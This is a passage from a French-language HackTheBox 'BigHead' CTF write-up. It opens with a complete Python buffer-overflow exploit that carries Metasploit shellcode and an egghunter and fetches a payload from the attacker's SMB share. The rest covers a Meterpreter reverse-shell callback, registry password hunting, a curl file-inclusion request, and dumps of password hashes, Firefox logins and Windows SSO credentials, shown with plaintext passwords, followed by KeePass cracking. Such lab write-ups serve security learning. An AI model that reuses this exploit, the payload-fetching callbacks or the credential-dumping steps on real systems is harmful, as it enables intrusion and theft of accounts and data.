import socket
import struct
from binascii import hexlify
from time import sleep

TARGET = '10.10.10.112'
PORT = 80

jmp_eax = 0x625012F2  # JMP EAX from bHeadSvr.dll
egg = "LOTF"
egg_minus_one = struct.unpack("I", egg.encode())[0] - 1

# Metasploit windows/exec shellcode with EXITFUNC=thread
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
buf += b"\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
buf += b"\xff\xd5"
buf += b"\\\\10.10.14.240\\public\\devloop.exe"
buf += b"\x00"

data = egg.encode() + buf

socket.setdefaulttimeout(5)

# On insère plusieurs fois notre shellcode dans la mémoire du process, ça peut permettre de le trouver plus vite
for i in range(10):
    print(i)
    sock = socket.socket()
    sock.connect((TARGET, PORT))

    buff = b"POST / HTTP/1.1\r\n"
    buff += b"Host: dev.bighead.htb\r\n"
    buff += "Content-Length: {}\r\n\r\n".format(len(data)).encode()
    buff += data
    try:
        sock.send(buff)
        sock.recv(4)
    except socket.timeout:
        pass
    sock.close()

sock = socket.socket()
sock.connect((TARGET, PORT))
print("Sending shellcode...")

shellcode = "/90"          # change to /CC for debuging
shellcode += "5E"          # pop esi
# put tag minus one in ebx
shellcode += "bb" + hexlify(struct.pack("I", egg_minus_one)).decode()
shellcode += "43"          # inc ebx
shellcode += "8b06"        # mov eax, [esi]
shellcode += "46"          # inc esi, 4
shellcode += "31d8"        # xor eax, ebx
shellcode += "75f9"        # jnz
shellcode += "464646"      # inc esi 3 times
shellcode += "ffe6"        # jmp esi

shellcode += "A" * (73 - len(shellcode))

buff = "HEAD " + shellcode + hexlify(struct.pack("I", jmp_eax)).decode()
buff += " HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n"
print("buff length is", len(buff))

sock.send(buff.encode())
sleep(1)
sock.close()
```

Cette fois l'exploit est d'une fiabilité parfaite : le shellcode final est exécuté et le thread termine proprement.  

Comme on cherche directement dans le tas il est aussi rapide alors que d'autres participants ont indiqué sur le forum de *HackTheBox* attendre plusieurs minutes avant l'arrivée du shell :)  

Après il peut arriver sur le CTF que l'exploit n'aboutisse pas. Parmi les raisons possibles on peut mentionner les dirbuster lancés sur le serveur qui ont pris la totalité de la mémoire (je rappelle qu'il manque des appel à *free()*) ou encore une collision sur le tag (moins probable si on le choisit correctement) qui amènera à un crash ou l'exécution d'un payload qui n'est pas le notre :D  

Dans tous les cas, la réelle configuration *Nginx* fait du load-balancing pour transférer les requêtes à l'une des dix instances de *BigHeadSvr.exe*. Par conséquent si ça ne marche pas du premier coup il suffit de relancer l'exploit.  

Nelson of a batch
-----------------

Une fois notre session Meterpreter obtenue (aucun AV ne tourne sur la machine, ça soulage un peu) on a la déception de voir que l'utilisateur Nelson n'a pas le flag *user.txt* sur son bureau...  

Le système a deux autres utilisateurs qui sont *Gilfoyle* (l'administrateur) et *nginx*.  

Il s'agit d'un système 32 bits, Windows 2008 (Build 6002, Service Pack 2). Metasploit suggère plusieurs exploits locaux mais aucun n'aboutit.  

On peut se servir d'un module auxiliaire pour lister les applications installées :  

```plain
meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on PIEDPIPER

Installed Applications
======================

 Name                                                              Version
 ----                                                              -------
 7-Zip 18.05                                                       18.05
 Bitnami TestLink Module                                           1.9.17-0
 Bitvise SSH Server 7.44 (remove only)                             7.44
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB953595)            1
 Hotfix for Microsoft .NET Framework 3.5 SP1 (KB958484)            1
 KeePass Password Safe 2.40                                        2.40
 Microsoft .NET Framework 3.5 SP1                                  3.5.30729
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft .NET Framework 4.5.2                                    4.5.51209
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.21022         9.0.21022
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161    9.0.30729.6161
 Mozilla Firefox 52.9.0 ESR (x86 en-GB)                            52.9.0
 Notepad++ (32-bit x86)                                            7.5.9
 Oracle VM VirtualBox Guest Additions 5.2.12                       5.2.12.0
 Python 2.7.15                                                     2.7.15150
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2604111)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2736416)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2840629)  1
 Security Update for Microsoft .NET Framework 3.5 SP1 (KB2861697)  1
 Update for Microsoft .NET Framework 3.5 SP1 (KB963707)            1
 Update for Microsoft .NET Framework 4.5.2 (KB4040977)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4096495)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4098976)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4338417)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4344149)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457019)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4457038)             1
 Update for Microsoft .NET Framework 4.5.2 (KB4459945)             1
 VMware Tools                                                      10.1.15.6677369
 XAMPP                                                             5.6.36-0
```

Il y a effectivement un serveur SSH qui tourne. Quand à KeePass on le retrouve dans *Program Files\kpps*.
L'énumération *classique* des services, process, permissions, fichiers n'ayant mené à rien il était temps de se pencher sur les ruches (hives) du registre Windows.  

```plain
c:\>reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\ProgID
    (Default)    REG_SZ    IAS.ChangePassword.1

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6BC0989B-0CE6-11D1-BAAE-00C04FC2E20D}\VersionIndependentProgID
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{6f45dc1e-5384-457a-bc13-2cd81b0d28ed}
    (Default)    REG_SZ    PasswordProvider

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{8841d728-1a76-4682-bb6f-a9ea53b4b3ba}
    (Default)    REG_SZ    LogonPasswordReset

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\IAS.ChangePassword\CurVer
    (Default)    REG_SZ    IAS.ChangePassword.1

--- snip ---

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx
    PasswordHash    REG_SZ    336d72676e6333205361797a205472794861726465722e2e2e203b440a

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RemoteAccess\Policy\Pipeline\23
    (Default)    REG_SZ    IAS.ChangePassword

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\DefaultUserConfiguration
    Password    REG_SZ

HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Terminal Server\WinStations\RDP-Tcp
    Password    REG_SZ
```

Quel est donc ce *PasswordHash* pour le service Nginx ?  

```python
>>> from binascii import unhexlify
>>> unhexlify("336d72676e6333205361797a205472794861726465722e2e2e203b440a")
b'3mrgnc3 Sayz TryHarder... ;D\n'
```

Vraiment très drôle (ou pas) !  

Si on regarde plus en détail cette clé on a quand même une autre valeur intéressante :  

```plain
[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nginx]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"=hex(2):43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,\
  20,00,46,00,69,00,6c,00,65,00,73,00,5c,00,6e,00,73,00,73,00,6d,00,5c,00,77,\
  00,69,00,6e,00,33,00,32,00,5c,00,6e,00,73,00,73,00,6d,00,2e,00,65,00,78,00,\
  65,00,00,00
"DisplayName"="Nginx"
"ObjectName"=".\\nginx"
"Description"="Nginx web server and proxy."
"DelayedAutostart"=dword:00000000
"FailureActionsOnNonCrashFailures"=dword:00000001
"FailureActions"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\
  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00
"Authenticate"=hex:48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,\
  39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,\
  00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00
"PasswordHash"="336d72676e6333205361797a205472794861726465722e2e2e203b440a"
```

```python
>>> "".join([chr(int(x, 16)) for x in "48,00,37,00,33,00,42,00,70,00,55,00,59,00,--- snip --- 37,00,74,00,38,00,37,00".split(",")[::2]])
'H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87'
```

/r/youseeingthisshit
--------------------

Ce mot de passe nous permet de nous connecter sur le *Bitvise SSH* en tant que Nginx. Il aura préalablement fallut port-forwarder le port 2020 depuis la session Meterpreter (*portfwd add -l 22 -p 2020 -r 127.0.0.1*).  

Le *Bitvise* est un peu... étrange : on ne peut pas exécuter de commandes Windows mais il propose un jeu de commandes Linux limité :  

```plain
AVAILABLE COMMANDS                                                                                                                                                                            
  exit, pwd, cd, ls, cat, chown, chgrp, attrib, uppercase, lowercase, echo, sleep, mkdir, mv, rmdir, rm, cp, ln, clear, pause, man, wc, more, find, grep
```

Seule consolation, on est dans la racine web du Nginx et on peut fouiller un peu :  

```php
bvshell:/apps/testlink/htdocs$ cat config_db.inc.php                                                                                                                                          
<?php                                                                                                                                                                                         
define('DB_TYPE', 'mysql');                                                                                                                                                                   
define('DB_USER', 'bn_testlink');                                                                                                                                                             
define('DB_PASS', 'd471fff8a1');                                                                                                                                                              
define('DB_HOST', 'localhost:3306');                                                                                                                                                          
define('DB_NAME', 'bitnami_testlink');
```

On peut repartir sur notre ancienne piste du *linkto.php* :  

```php
// alpha 0.0.1 implementation of our new pipercoin authentication tech                                                                                                                        
// full API not done yet. just submit tokens with requests for now.                                                                                                                           
if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php                                                                                           
        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                                                                       
        $PiperCoinAvitar = (string)$PiperCoinSess;}                                                                                                                                           

// some session and settings stuff from original index.php                                                                                                                                    
require_once('lib/functions/configCheck.php');                                                                                                                                                
checkConfiguration();                                                                                                                                                                         
require_once('config.inc.php');                                                                                                                                                               
require_once('common.php');                                                                                                                                                                   
require_once('attachments.inc.php');                                                                                                                                                          
require_once('requirements.inc.php');                                                                                                                                                         
require_once('testcase.class.php');                                                                                                                                                           
require_once('testproject.class.php');                                                                                                                                                        
require_once('users.inc.php');                                                                                                                                                                
require_once($PiperCoinAuth);                                                                                                                                                                 
testlinkInitPage($db, true);
```

On peut exploiter la vulnérabilité pour obtenir enfin le premier flag :  

```bash
curl -X POST http://code.bighead.htb/testlink/linkto.php --data "PiperID=set&PiperCoinID=../../../user.txt"
```

Comme à ce stade on ne dispose toujours pas de *vrai* exécution de commande, il faut pouvoir passer à *require\_once()* un script PHP à nous.  

Et ce n'est pas si facile car la plupart des [wrappers](https://secure.php.net/manual/en/wrappers.php) ont été désactivés (http, ftp, php, data).  

La solution adoptée a consisté à placer le script PHP (qui fait juste un *system()*) dans *C:\Users\Public\Downloads\*.  

```plain
[*] Started reverse TCP handler on 10.10.14.240:80
[*] Sending stage (179783 bytes) to 10.10.10.112
[*] Meterpreter session 621 opened (10.10.14.240:80 -> 10.10.10.112:49477) at 2018-12-15 11:56:50 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Avec des droits pareils on se dit qu'on en a enfin finit mais en fait non...  

```plain
meterpreter > cat root.txt

                    * * *

              Gilfoyle's Prayer

___________________6666666___________________
____________66666__________66666_____________
_________6666___________________666__________
_______666__6____________________6_666_______
_____666_____66_______________666____66______
____66_______66666_________66666______666____
___66_________6___66_____66___66_______666___
__66__________66____6666_____66_________666__
_666___________66__666_66___66___________66__
_66____________6666_______6666___________666_
_66___________6666_________6666__________666_
_66________666_________________666_______666_
_66_____666______66_______66______666____666_
_666__666666666666666666666666666666666__66__
__66_______________6____66______________666__
___66______________66___66_____________666___
____66______________6__66_____________666____
_______666___________666___________666_______
_________6666_________6_________666__________
____________66666_____6____66666_____________
___________________6666666________________

   Prayer for The Praise of Satan's Kingdom

              Praise, Hail Satan!
   Glory be to Satan the Father of the Earth
       and to Lucifer our guiding light
    and to Belial who walks between worlds
     and to Lilith the queen of the night
    As it was in the void of the beginning
                   Is now,
and ever shall be, Satan's kingdom without End

                so it is done.

                    * * *
```

[Hail Satan !](https://www.youtube.com/watch?v=8iqcId_8KVE)  

La suite a consisté à extraire quelques hashs et passwords :  

```plain
meterpreter > run hashdump

[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.
[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 825c9e5d797816cc73c2a5734112d6c7...
/usr/share/metasploit-framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
/usr/share/metasploit-framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated
/usr/share/metasploit-framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated
[*] Dumping password hints...

Gilfoyle:"         "
Nelson:"password"

[*] Dumping password hashes...

Gilfoyle:500:aad3b435b51404eeaad3b435b51404ee:9216302ed9e7d9f717156ec796aeb69a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
nginx:1000:aad3b435b51404eeaad3b435b51404ee:639c9d1b2c2afc36e5009c6f1c65cefd:::
Nelson:1002:aad3b435b51404eeaad3b435b51404ee:9de26a8b86512e11228e8ab1c7955dec:::
```

```plain
msf post(multi/gather/firefox_creds) > run

[*] Checking for Firefox profile in: C:\Users\nginx\AppData\Roaming\Mozilla\
[-] Firefox was not found (Missing profiles.ini)
[*] Checking for Firefox profile in: C:\Users\Nelson\AppData\Roaming\Mozilla\
[*] Checking for Firefox profile in: C:\Users\Administrator\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\Nelson\AppData\Roaming\Mozilla\Firefox\Profiles\to6utj94.default
[+] Downloaded cert8.db: /root/.msf4/loot/20181215141619_default_10.10.10.112_ff.to6utj94.cert_961508.bin
[+] Downloaded cookies.sqlite: /root/.msf4/loot/20181215141620_default_10.10.10.112_ff.to6utj94.cook_650166.bin
[+] Downloaded key3.db: /root/.msf4/loot/20181215141622_default_10.10.10.112_ff.to6utj94.key3_532842.bin

[*] Profile: C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\nbpe2hdg.default
[+] Downloaded cert8.db: /root/.msf4/loot/20181215141623_default_10.10.10.112_ff.nbpe2hdg.cert_445097.bin
[+] Downloaded cookies.sqlite: /root/.msf4/loot/20181215141624_default_10.10.10.112_ff.nbpe2hdg.cook_196527.bin
[+] Downloaded key3.db: /root/.msf4/loot/20181215141626_default_10.10.10.112_ff.nbpe2hdg.key3_603216.bin
[+] Downloaded logins.json: /root/.msf4/loot/20181215141626_default_10.10.10.112_ff.nbpe2hdg.logi_599016.bin

python2 firefox_decrypt.py /tmp/nbpe2hdg.default
2018-12-15 14:23:37,992 - WARNING - profile.ini not found in /tmp/nbpe2hdg.default
2018-12-15 14:23:37,993 - WARNING - Continuing and assuming '/tmp/nbpe2hdg.default' is a profile location

Master Password for profile /tmp/nbpe2hdg.default:
2018-12-15 14:23:39,352 - WARNING - Attempting decryption with no Master Password

Website:   http://127.0.0.1:5080
Username: 'dinesh'
Password: 'gRv5Be2Min9Hc091263x10KcdffGG'
```

```plain
msf post(windows/gather/credentials/sso) > run

[*] Running module against PIEDPIPER
Windows SSO Credentials
=======================

AuthID    Package  Domain     User      Password
------    -------  ------     ----      --------
0;131384  NTLM     PIEDPIPER  Gilfoyle  h@ck7h380x-3mrgnc3
0;154359  NTLM     PIEDPIPER  nginx     H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87
0;244078  NTLM     PIEDPIPER  Gilfoyle
0;421083  NTLM     PIEDPIPER  nginx
0;466499  NTLM     PIEDPIPER  Nelson

[*] Post module execution completed
```

Tout cela n'a mené une fois de plus nul part. En revanche on trouve la configuration pour le KeePass de l'administrateur (*KeePass.config.xml* dans *C:\Users\Administrator\AppData\Roaming\KeePass*) :  

```html
    <Application>
        <LastUsedFile>
            <Path>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</Path>
            <CredProtMode>Obf</CredProtMode>
            <CredSaveMode>NoSave</CredSaveMode>
        </LastUsedFile>
        <MostRecentlyUsed>
            <MaxItemCount>12</MaxItemCount>
            <Items>
                <ConnectionInfo>
                    <Path>..\..\Users\Administrator\Desktop\chest.kdbx</Path>
                    <CredProtMode>Obf</CredProtMode>
                    <CredSaveMode>NoSave</CredSaveMode>
                </ConnectionInfo>
            </Items>
        </MostRecentlyUsed>
        <WorkingDirectories>
            <Item>Database@..\..\Users\Administrator\Desktop</Item>
            <Item>KeyFile@..\..\Users\Administrator\Desktop</Item>
        </WorkingDirectories>
        <Start>
            <CheckForUpdate>false</CheckForUpdate>
            <CheckForUpdateConfigured>true</CheckForUpdateConfigured>
        </Start>
        <FileOpening />
        <FileClosing />
        <TriggerSystem>
            <Triggers />
        </TriggerSystem>
        <PluginCompatibility />
    </Application>

    <Defaults>
        <OptionsTabIndex>0</OptionsTabIndex>
        <SearchParameters>
            <ComparisonMode>InvariantCultureIgnoreCase</ComparisonMode>
        </SearchParameters>
        <KeySources>
            <Association>
                <DatabasePath>..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier</DatabasePath>
                <Password>true</Password>
                <KeyFilePath>..\..\Users\Administrator\Pictures\admin.png</KeyFilePath>
            </Association>
        </KeySources>
    </Defaults>
```

Le petit malin ! Il a dissimulé la base KeePass dans l'ADS *Zone.Identifier* du *root.txt* !  

Cette base est associée à un KeyFile qui est juste une image PNG.  

Il ne reste normalement plus qu'à casser le mot de passe du *KeePass* (on extrait le hash avec *keepass2john* comme on l'avait fait pour [Jeeves](http://devloop.users.sourceforge.net/index.php?article163/solution-du-ctf-jeeves-de-hackthebox)).  

Il y avait tout de même une subtilité puisque la dernière release officielle de JTR Jumbo ne supporte pas les *KeyFile*. Heureusement il existe [un Github plus à jour](https://github.com/magnumripper/JohnTheRipper) (merci *opt1kz*) qui permet de spécifier le *KeyFile* avec l'option -k (youpi) de d'obtenir le flag final :)  

![BigHead CTF root flag KeePass](https://github.com/devl00p/blog/raw/master/images/htb/bighead_root_flag.png)  

Outro
-----

Tout comme pour [c0m80](http://devloop.users.sourceforge.net/index.php?article151/solution-du-ctf-c0m80-1-de-vulnhub) (créé aussi par [3mrgnc3](https://twitter.com/@3mrgnc3)) je ne suis pas mécontent d'être arrivé à la fin de celui-là :'D  

Bonux
-----

Juste par curiosité j'ai récupéré les fichiers *access.log* et *error.log* du serveur pour voir d'autres shellcodes qui ont été utilisés.  

On peut utiliser *pwntools* (c'est du Python 2) pour convertir le code hexa en assembleur :  

```python
from __future__ import with_statement, print_function
import re
import sys

from pwnlib.asm import disasm

regex = re.compile(r"HEAD\s+/?([0-9a-fA-F]+)")
shellcodes = set()

with open(sys.argv[1]) as fd:
    for line in fd:
        line = line.strip()
        search = regex.search(line)
        if not search:
            continue

        hex_code = search.group(1)
        if len(hex_code) % 2:
            continue

        if hex_code in shellcodes:
            continue

        shellcodes.add(hex_code)
        print(disasm(hex_code.decode("hex")))
        print("")
```

Les shellcodes se ressemblent malheureusement tous, seul le tag change :  

```asm
   0:   66 81 ca ff 0f          or     dx,0xfff
   5:   42                      inc    edx
   6:   52                      push   edx
   7:   6a 02                   push   0x2
   9:   58                      pop    eax
   a:   cd 2e                   int    0x2e
   c:   3c 05                   cmp    al,0x5
   e:   5a                      pop    edx
   f:   74 ef                   je     0x0
  11:   b8 33 6d 6e 33          mov    eax,0x336e6d33
  16:   8b fa                   mov    edi,edx
  18:   af                      scas   eax,DWORD PTR es:[edi]
  19:   75 ea                   jne    0x5
  1b:   af                      scas   eax,DWORD PTR es:[edi]
  1c:   75 e7                   jne    0x5
  1e:   ff e7                   jmp    edi
  20:   aa                      stos   BYTE PTR es:[edi],al
  21:   aa                      stos   BYTE PTR es:[edi],al
  22:   aa                      stos   BYTE PTR es:[edi],al
  23:   aa                      stos   BYTE PTR es:[edi],al
  24:   19 2f                   sbb    DWORD PTR [edi],ebp
  26:   55                      push   ebp
  27:   64                      fs
```

Il s'agit du egghunter *NtDisplayString* que l'on trouve [dans le tutoriel de Corelan](https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/) (la fin c'est du padding et l'adresse du gadget).  

Il y avait aussi cette variante :  

```plain
HEAD /coffeeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA311350626681caff0f42526a0258cd2e3c055a74efb8773030748bfaaf75eaaf75e7ffe7
```

Ici le shellcode est placé après l'adresse de retour (0x62501331 qui correspond à un *jmp esp*) :  

```asm
   0:   66 81 ca ff 0f          or     dx,0xfff
   5:   42                      inc    edx
   6:   52                      push   edx
   7:   6a 02                   push   0x2
   9:   58                      pop    eax
   a:   cd 2e                   int    0x2e
   c:   3c 05                   cmp    al,0x5
   e:   5a                      pop    edx
   f:   74 ef                   je     0x0
  11:   b8 77 30 30 74          mov    eax,0x74303077
  16:   8b fa                   mov    edi,edx
  18:   af                      scas   eax,DWORD PTR es:[edi]
  19:   75 ea                   jne    0x5
  1b:   af                      scas   eax,DWORD PTR es:[edi]
  1c:   75 e7                   jne    0x5
  1e:   ff e7                   jmp    edi
```

Il prend plus de place et met plus de temps à s'exécuter que le mien donc pas de regret :p

*Published May 04 2019 at 17 04*